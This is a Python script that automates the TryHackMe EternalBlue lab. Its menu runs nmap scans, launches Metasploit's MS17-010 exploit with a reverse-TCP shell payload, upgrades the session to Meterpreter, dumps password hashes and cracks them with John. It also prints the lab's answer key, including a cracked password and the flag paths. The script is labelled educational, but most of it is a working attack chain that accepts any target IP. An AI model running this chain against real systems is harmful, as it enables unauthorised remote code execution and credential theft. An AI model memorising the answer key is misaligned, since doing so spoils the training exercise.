# EternalBlue Lab Educational Tool (Python Version)
# Author: For Educational Use Only

import os
import subprocess
import time


def clear():
    os.system('clear' if os.name == 'posix' else 'cls')


def banner():
    clear()
    print("""
\033[1;34m
██████▄ ██│     ██│   ██│██████▄
██╌╌██│██│     ██│   ██│██╌╌╌╌██
██████│██│     ██│   ██│█████▄  
██╌╌╌╌│ ██│     ██│   ██│██╌╌╌╌  
██│     ██████▄┬═█████▄┬██████▄
╌╌│     ╌╌╌╌╌╌╌╌ ╌╌╌╌╌╌╌╌ ╌╌╌╌╌╌╌
       🧠 TryHackMe – EternalBlue\033[0m
""")


def show_description():
    print("\n\033[1;36m==[ LAB DESCRIPTION ]==\033[0m")
    time.sleep(2)
    print("""
📖 Background:
EternalBlue (MS17-010) is a vulnerability in Microsoft SMBv1 protocol...
⚠️  Impact:
- Remote code execution
- Led to WannaCry

🎯 Purpose:
- Scan, Detect, Exploit, Capture Flags

🛠 Tools:
- Nmap, Metasploit, NSE scripts

🚀 Learning Objectives:
1. Understand EternalBlue
2. SMB Vulnerability Scanning
3. Exploiting with Metasploit
4. Post-Exploitation

🔐 Reminder:
Educational use only. Do not attack unauthorized systems.
""")
    input("[*] Press Enter to return to menu...")


def show_tasks():
    print("\n\033[1;35m==[ TASK CHECKLIST ]==\033[0m")
    steps = [
        "1. Connect to VPN",
        "2. Discover target machine",
        "3. Scan with Nmap",
        "4. Identify MS17-010 vulnerability",
        "5. Exploit using Metasploit",
        "6. Convert shell to Meterpreter",
        "7. Dump and crack hashes",
        "8. Find the flags"
    ]
    for step in steps:
        print(step)
        time.sleep(1)
    input("[*] Press Enter to return to menu...")


def connect_vpn():
    vpnfile = input("[?] Enter path to your TryHackMe .ovpn file: ")
    if not os.path.isfile(vpnfile):
        print("[!] File not found.")
        return
    print("[+] Connecting to VPN...")
    subprocess.call(["sudo", "openvpn", "--config", vpnfile])


def run_exploit():
    vpnfile = input("[?] Enter path to your TryHackMe .ovpn file: ")
    if not os.path.isfile(vpnfile):
        print("[!] File not found.")
        return
    subprocess.Popen(["sudo", "openvpn", "--config", vpnfile])
    time.sleep(10)
    os.system("ip a | grep tun")

    rhost = input("[?] Enter Target IP (RHOST): ")
    lhost = input("[?] Enter Your IP (LHOST): ")
    lport = input("[?] Enter Listening Port (default 4444): ") or "4444"

    print("[+] Running Nmap scans...")
    os.system(f"nmap -sS -sV -O -Pn {rhost} -oN initial_scan.txt")
    os.system(f"nmap -sV --script vuln {rhost} -oN vuln_scan.txt")

    msf_cmd = f"""
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {rhost}
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD windows/x64/shell/reverse_tcp
exploit -z
"""
    subprocess.call(["msfconsole", "-q", "-x", msf_cmd])

    session = input("[?] Enter session ID to upgrade to Meterpreter: ")
    post_cmd = f"""
use post/multi/manage/shell_to_meterpreter
set SESSION {session}
run
sessions -i {session}
sysinfo
hashdump
"""
    subprocess.call(["msfconsole", "-q", "-x", post_cmd])

    hash_val = input("[?] Paste any cracked hash to crack: ")
    with open("hash1.txt", "w") as f:
        f.write(hash_val + "\n")
    os.system("john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt")
    print("[✓] Done. Use 'sessions -i <ID>' to reattach anytime.")
    input("[*] Press Enter to return to menu...")


def show_answers():
    print("\n\033[1;33m==[ QUESTIONS & ANSWERS ]==\033[0m")
    qna = [
        ("How many ports under 1000 are open?", "3"),
        ("Vulnerable to?", "ms17-010"),
        ("Exploit path?", "exploit/windows/smb/ms17_010_eternalblue"),
        ("Required option name?", "RHOSTS"),
        ("Shell-to-Meterpreter module?", "post/multi/manage/shell_to_meterpreter"),
        ("Required post module option?", "SESSION"),
        ("Non-default user?", "jon"),
        ("Cracked password?", "alqfna22"),
        ("Flag1:", "C:\\flag1.txt"),
        ("Flag2:", "C:\\Windows\\System32\\config\\flag2.txt"),
        ("Flag3:", "C:\\Users\\Administrator\\Documents\\flag3.txt")
    ]
    for q, a in qna:
        print(f"🔹 {q}\n➡️  {a}")
        time.sleep(1)
    input("[*] Press Enter to return to menu...")


# Main menu loop
while True:
    banner()
    print("--------------------------------------------")
    print("1. View Lab Description")
    print("2. View Task Checklist")
    print("3. Connect to VPN Only")
    print("4. Start Exploitation Lab")
    print("5. View Lab Questions and Answers")
    print("6. Exit")
    print("--------------------------------------------")
    choice = input("[*] Choose an option [1-6]: ")

    if choice == '1':
        show_description()
    elif choice == '2':
        show_tasks()
    elif choice == '3':
        connect_vpn()
    elif choice == '4':
        run_exploit()
    elif choice == '5':
        show_answers()
    elif choice == '6':
        print("[✓] Goodbye!")
        break
    else:
        print("[!] Invalid option. Please enter 1–6.")
        time.sleep(1)
